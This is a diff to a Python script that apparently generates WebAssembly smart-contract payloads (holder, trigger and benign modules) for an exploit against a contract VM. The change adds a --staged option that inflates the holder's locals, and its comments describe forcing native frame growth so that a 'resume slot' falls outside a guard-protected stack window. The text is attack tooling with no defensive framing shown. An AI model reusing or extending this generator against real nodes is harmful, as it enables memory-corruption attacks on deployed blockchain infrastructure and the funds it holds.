@@ -48,9 +48,11 @@ ALLOCATOR = """  (global $heap (mut i32) (i32.const 8192))
   (func (export "interface_version_8"))"""
 
 
-def gen_holder(outdir, dummy=0):
+def gen_holder(outdir, dummy=0, staged=10):
     req = ('{"wasm":{"smart":{"contract_addr":"%s","msg":"e30="}}}' % TRIGGER_ADDR).encode()
-    N = 10  # staged locals; more locals => more spill pressure (mirrors the Rust HOLDER_WAT)
+    # staged locals; more locals => more spill pressure => a REAL native frame growth
+    # (the resume slot moves deeper, out of the guard-protected top window)
+    N = staged
     # staged local values, derived from $env (distinct per slot: 0x1000..0x1009)
     staged = [
         "(i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x%04x))"
@@ -81,8 +83,11 @@ def gen_holder(outdir, dummy=0):
         f'  (data (i32.const 1024) "{esc(RESP_HIT)}")',
         '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
         '  (func (export "execute") (param $env i32) (param $info i32) (param $msg i32) (result i32)',
-        "    (local $l0 i64) (local $l1 i64) (local $l2 i64) (local $l3 i64) (local $l4 i64)",
-        "    (local $l5 i64) (local $l6 i64) (local $l7 i64) (local $l8 i64) (local $l9 i64)",
+    ]
+    for i in range(0, N, 5):
+        chunk = " ".join(f"(local $l{k} i64)" for k in range(i, min(i + 5, N)))
+        lines.append("    " + chunk)
+    lines += [
         "    (local $hit i32)",
         "    ;; stage distinctive values in locals (live across the query call)",
     ]
@@ -261,10 +266,12 @@ def main():
                     help="extra i32 trigger locals (live in the loop) to flip 8B batch alignment parity")
     ap.add_argument("--call-query", action="store_true",
                     help="trigger loop calls query_chain (observability) instead of db_read")
+    ap.add_argument("--staged", type=int, default=10,
+                    help="number of holder staged locals (more => forced native frame growth)")
     args = ap.parse_args()
     os.makedirs(args.outdir, exist_ok=True)
     call_kind = "query" if args.call_query else "db_read"
-    gen_holder(args.outdir, args.dummy)
+    gen_holder(args.outdir, args.dummy, args.staged)
     gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants,
                 args.plant_addr, args.dense_tail, args.frame32, call_kind)
     gen_benign(args.outdir)
